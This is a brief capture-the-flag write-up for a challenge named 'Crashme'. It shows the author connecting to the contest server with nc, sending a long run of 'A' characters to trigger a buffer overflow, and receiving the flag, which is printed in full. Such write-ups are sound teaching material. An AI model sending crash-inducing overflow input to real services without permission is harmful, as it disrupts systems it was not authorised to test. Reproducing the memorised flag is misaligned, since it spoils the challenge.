# Crashme

## Description
```
Can you break the program?

nc ctf.mf.grsu.by 9024
```

## Writeup

Now there are multiple ways to crash a problem but the one I thought of first was a buffer overflow. <br/>
Thinking of it I proceeded and tried it out. <br/>
```sh
kali@kali nc ctf.mf.grsu.by 9024
Give me some data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Your flag: grodno{a151c0S3gfaults_4re_a_gr3at_fr1end_0f_h4ck3r57f2819}
```

Obtaining the flag `grodno{a151c0S3gfaults_4re_a_gr3at_fr1end_0f_h4ck3r57f2819}` concludes this writeup. 